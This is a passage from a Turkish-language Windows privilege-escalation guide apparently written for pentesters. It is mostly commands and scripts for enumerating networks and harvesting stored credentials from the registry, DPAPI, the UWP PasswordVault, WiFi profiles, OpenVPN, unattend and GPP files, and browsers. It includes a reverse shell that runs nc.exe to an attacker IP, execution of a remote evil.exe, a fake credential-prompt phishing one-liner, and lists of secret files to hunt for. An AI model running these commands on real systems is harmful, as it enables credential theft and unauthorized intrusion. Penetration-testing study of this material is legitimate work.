net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts dosyası

hosts dosyasında sabit kodlanmış diğer bilinen bilgisayarları kontrol edin
```
type C:\Windows\System32\drivers\etc\hosts
```
### Ağ Arayüzleri ve DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Açık Portlar

Dışarıdan **kısıtlanmış servisleri** kontrol edin
```bash
netstat -ano #Opened ports?
```
### Yönlendirme Tablosu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tablosu
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Kuralları

[**Firewall ile ilgili komutlar için bu sayfaya göz atın**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listeleme, kural oluşturma, devre dışı bırakma, devre dışı bırakma...)**

Ağ enumerasyonu için daha fazla[ komut burada](../basic-cmd-for-pentesters.md#network)

### Linux için Windows Alt Sistemi (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
`bash.exe` binary dosyası `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` konumunda da bulunabilir.

root user elde ederseniz herhangi bir portu dinleyebilirsiniz (`nc.exe` ile ilk kez bir portu dinlemeyi denediğinizde, GUI üzerinden `nc` uygulamasına firewall tarafından izin verilip verilmeyeceği sorulur).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash'i root olarak kolayca başlatmak için `--default-user root` seçeneğini deneyebilirsiniz.

`WSL` filesystem'ını `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe inceleyebilirsiniz.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Kimlik Bilgileri yöneticisi / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault, **Windows**'un **kullanıcıların oturumunu otomatik olarak açmak** için kullanabileceği sunucular, web siteleri ve diğer programlara ait kullanıcı kimlik bilgilerini depolar. İlk bakışta bu, kullanıcıların Facebook, Twitter veya Gmail gibi sitelere ait kimlik bilgilerini depolayabileceği ve tarayıcıların otomatik olarak oturum açmasını sağlayabileceği anlamına geliyor gibi görünebilir; ancak sistem bu şekilde çalışmaz.

Windows Vault, Windows'un kullanıcıların oturumunu otomatik olarak açabilmesi için kullanabileceği kimlik bilgilerini depolar. Bu da **bir kaynağa erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir Windows uygulamasının** (sunucu veya web sitesi) **bu Credential Manager** ve Windows Vault'tan yararlanabileceği ve kullanıcıların her seferinde kullanıcı adı ile parolayı girmesi yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmediği sürece, belirli bir kaynağa ait kimlik bilgilerini kullanmalarının mümkün olduğunu düşünmüyorum. Bu nedenle uygulamanız vault'tan yararlanmak istiyorsa, bir şekilde **credential manager ile iletişim kurmalı ve varsayılan depolama vault'undan bu kaynak için kimlik bilgilerini istemelidir**.

Makinede depolanan kimlik bilgilerini listelemek için `cmdkey` kullanın.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Ardından, kayıtlı kimlik bilgilerini kullanmak için `runas` komutunu `/savecred` seçenekleriyle kullanabilirsiniz. Aşağıdaki örnekte, bir SMB paylaşımı üzerinden uzak bir binary çağrılmaktadır.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Sağlanan kimlik bilgileriyle `runas` kullanma.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) aracılığıyla.

### UWP PasswordVault / Credential Locker

Modern Windows UWP uygulamaları, Microsoft Edge ve modern sistem servisleri; kimlik doğrulama token'larını ve düz metin parolalarını Universal Windows Platform (UWP) `PasswordVault` içinde depolar (`vaultcmd` içinde `Web Credentials` olarak da gösterilir). Bu depolama alanı oturumdan izole edilmiştir ve yönetici veya `SeDebugPrivilege` yetkileri olmadan yerel olarak çözülebilir.

Depolanan tüm kullanıcı adlarını ve düz metin parolalarını anında dökmek ve şifresini çözmek için bu PowerShell komutunu kullanıcının etkin oturumu içinde çalıştırın:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sağlar ve ağırlıklı olarak Windows işletim sistemi içinde asimetrik özel anahtarların simetrik şifrelenmesi amacıyla kullanılır. Bu şifreleme, entropiye önemli ölçüde katkıda bulunmak için bir kullanıcı veya sistem sırrından yararlanır.

**DPAPI, anahtarların kullanıcının oturum açma sırlarından türetilen bir simetrik anahtar aracılığıyla şifrelenmesini sağlar**. Sistem şifrelemesi söz konusu olduğunda, sistemin domain authentication sırlarını kullanır.

DPAPI kullanılarak şifrelenen kullanıcı RSA anahtarları, `{SID}` kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil edecek şekilde `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır. **Aynı dosyada kullanıcının özel anahtarlarını koruyan master key ile birlikte bulunan DPAPI anahtarı**, genellikle 64 byte rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu ve içeriğinin CMD'deki `dir` komutuyla listelenemediğini, ancak PowerShell aracılığıyla listelenebildiğini unutmayın.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Uygun argümanlarla (`/pvk` veya `/rpc`) şifresini çözmek için **mimikatz module** `dpapi::masterkey` kullanabilirsiniz.

**master password** tarafından korunan kimlik bilgileri dosyaları genellikle şu konumda bulunur:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
`mimikatz module` içindeki `dpapi::cred` komutunu, uygun `/masterkey` ile kullanarak şifre çözebilirsiniz.\
`sekurlsa::dpapi` module'ü ile **memory** üzerinden birçok **DPAPI** **masterkey**'i **extract** edebilirsiniz (root iseniz).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials**, şifrelenmiş credentials'ları kolayca depolamak için genellikle **scripting** ve otomasyon görevlerinde kullanılır. Credentials, **DPAPI** kullanılarak korunur; bu da genellikle yalnızca oluşturuldukları bilgisayarda aynı user tarafından decrypt edilebilecekleri anlamına gelir.

Bir PS credentials'ını içeren file'dan **decrypt** etmek için şunu çalıştırabilirsiniz:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Kaydedilmiş RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\` içinde bulabilirsiniz.

### Yakın Zamanda Çalıştırılan Komutlar
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Uzak Masaüstü Kimlik Bilgisi Yöneticisi**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Uygun `/masterkey` ile **herhangi bir .rdg dosyasının şifresini çözmek** için **Mimikatz** `dpapi::rdg` modülünü kullanın\
Mimikatz `sekurlsa::dpapi` modülüyle bellekten **çok sayıda DPAPI masterkey'i çıkarabilirsiniz**

### Sticky Notes

Kullanıcılar çoğu zaman Windows workstation'larında **şifreleri** ve diğer bilgileri kaydetmek için Sticky Notes uygulamasını kullanır; bunun bir veritabanı dosyası olduğunu fark etmezler. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve her zaman aranıp incelenmeye değerdir.

### AppCmd.exe

**AppCmd.exe'den şifreleri kurtarmak için Administrator olmanız ve High Integrity düzeyinde çalışmanız gerektiğini unutmayın.**\
**AppCmd.exe**, `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya mevcutsa bazı **kimlik bilgilerinin** yapılandırılmış ve **kurtarılabilir** olması mümkündür.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) içinden çıkarılmıştır:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının mevcut olup olmadığını kontrol edin .\
Installer'lar **SYSTEM ayrıcalıklarıyla çalıştırılır**, birçoğu **DLL Sideloading'e karşı savunmasızdır (**[**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc) kaynağından bilgi**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dosyalar ve Registry (Kimlik Bilgileri)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Anahtarları
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Registry'de SSH anahtarları

SSH private keys, `HKCU\Software\OpenSSH\Agent\Keys` registry key'inin içinde saklanabilir; bu nedenle içinde ilginç bir şey olup olmadığını kontrol etmelisiniz:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Bu yol içinde herhangi bir kayıt bulursanız, bu muhtemelen kaydedilmiş bir SSH key'dir. Şifrelenmiş olarak depolanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` service çalışmıyorsa ve açılışta otomatik olarak başlamasını istiyorsanız, şunu çalıştırın:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Görünüşe göre bu teknik artık geçerli değil. Bazı SSH anahtarları oluşturmayı, bunları `ssh-add` ile eklemeyi ve SSH üzerinden bir makineye giriş yapmayı denedim. HKCU\Software\OpenSSH\Agent\Keys kayıt defteri anahtarı mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM ve SYSTEM yedekleri
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Bulut Kimlik Bilgileri
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** adlı bir dosya arayın.

### Önbelleğe alınmış GPP Password

Daha önce, Group Policy Preferences (GPP) aracılığıyla bir makine grubu üzerinde özel local administrator hesaplarının dağıtılmasına olanak tanıyan bir özellik mevcuttu. Ancak bu yöntemin önemli güvenlik açıkları vardı. İlk olarak, SYSVOL içinde XML dosyaları olarak depolanan Group Policy Objects (GPOs), herhangi bir domain kullanıcısı tarafından erişilebilir durumdaydı. İkinci olarak, bu GPP'ler içindeki ve herkese açık şekilde belgelenmiş varsayılan bir anahtar kullanılarak AES256 ile şifrelenen parolaların şifresi, kimliği doğrulanmış herhangi bir kullanıcı tarafından çözülebiliyordu. Bu durum, kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine olanak tanıyabileceğinden ciddi bir risk oluşturuyordu.

Bu riski azaltmak amacıyla, `"cpassword"` alanı boş olmayan, yerel olarak önbelleğe alınmış GPP dosyalarını tarayan bir işlev geliştirildi. Böyle bir dosya bulunduğunda işlev parolanın şifresini çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, GPP ve dosyanın konumu hakkındaki ayrıntıları içerir ve bu güvenlik açığının tespit edilmesine ve giderilmesine yardımcı olur.

Bu dosyalar için `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesinde)_ konumlarında arama yapın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'ın şifresini çözmek için:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec kullanarak parolaları alma:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Kimlik bilgileri içeren web.config örneği:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN kimlik bilgileri
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Günlükler
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Kimlik bilgilerini isteyin

Bilebileceğini düşünüyorsanız, kullanıcıdan kendi **kimlik bilgilerini** veya farklı bir kullanıcının **kimlik bilgilerini** girmesini her zaman isteyebilirsiniz (**kimlik bilgilerini** doğrudan istemciye sormanın gerçekten **riskli** olduğunu unutmayın):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Kimlik bilgileri içerebilecek olası dosya adları**

Geçmişte **parolaları** **açık metin** veya **Base64** biçiminde içeren bilinen dosyalar
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Önerilen tüm dosyalarda ara:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Geri Dönüşüm Kutusu'ndaki Kimlik Bilgileri

Kimlik bilgilerini bulmak için Geri Dönüşüm Kutusu'nu da kontrol etmelisiniz.

Çeşitli programlar tarafından kaydedilen **parolaları kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Registry içinde

**Kimlik bilgileri içerebilecek diğer olası registry anahtarları**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome veya Firefox** parolalarının depolandığı db'leri kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer imlerini ve favorilerini de kontrol edin; bazı **parolalar** burada depolanıyor olabilir.

Tarayıcılardan parola çıkarmak için araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, farklı dillerdeki yazılım bileşenleri arasında **intercommunication** sağlayan, Windows işletim sisteminin içinde yerleşik bir teknolojidir. Her COM bileşeni bir class ID (CLSID) aracılığıyla **tanımlanır** ve her bileşen, interface ID'leri (IID'ler) aracılığıyla tanımlanan bir veya daha fazla interface üzerinden işlevsellik sunar.

COM class'ları ve interface'leri sırasıyla **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında registry'de tanımlanır. Bu registry, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** birleştirilerek oluşturulur ve **HKEY\CLASSES\ROOT** adını alır.

Bu registry'nin CLSID'leri içinde, bir **DLL**'yi gösteren **default value** ile **ThreadingModel** adlı bir value içeren **InProcServer32** child registry'sini bulabilirsiniz. **ThreadingModel** değeri **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single veya Multi) ya da **Neutral** (Thread Neutral) olabilir.

![Browsers History - COM DLL Overwriting: Bu registry'nin CLSID'leri içinde, bir DLL'yi gösteren default value ile bir value... içeren InProcServer32 child registry'sini bulabilirsiniz.](<../../images/image (729).png>)

Temel olarak, çalıştırılacak **DLL'lerden herhangi birinin üzerine yazabiliyorsanız**, bu DLL farklı bir user tarafından çalıştırılacaksa **privilege escalation** gerçekleştirebilirsiniz.

Saldırganların COM Hijacking'i bir persistence mekanizması olarak nasıl kullandığını öğrenmek için şuraya bakın:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve registry'de Generic Password araması**

**Dosya içeriklerini arayın**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Belirli bir dosya adına sahip dosya arama**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Kayıt defterinde anahtar adlarını ve parolaları arayın**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Parola arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** plugin'idir; bu plugin'i, victim içindeki credential'ları arayan her metasploit POST module'ünü **otomatik olarak çalıştırmak** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen parolaları içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parola çıkarmak için kullanılan başka bir harika araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) arama yapan bir araçtır; bu verileri açık metin olarak kaydeden çeşitli araçların **oturumlarını**, **kullanıcı adlarını** ve **parolalarını** arar (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**SYSTEM olarak çalışan bir process'in** (`OpenProcess()`) **tam erişimle yeni bir process açtığını** düşünün. Aynı process, **ana process'in tüm açık handle'larını devralan, düşük ayrıcalıklara sahip yeni bir process de oluşturur** (`CreateProcess()`).\
Ardından, **düşük ayrıcalıklı process'e tam erişiminiz varsa**, `OpenProcess()` ile oluşturulan **privileged process'e ait açık handle'ı alabilir** ve **bir shellcode inject edebilirsiniz**.\
**Bu vulnerability'yi nasıl tespit edip exploit edeceğinize** dair daha fazla bilgi için [bu örneği okuyun](leaked-handle-exploitation.md).\
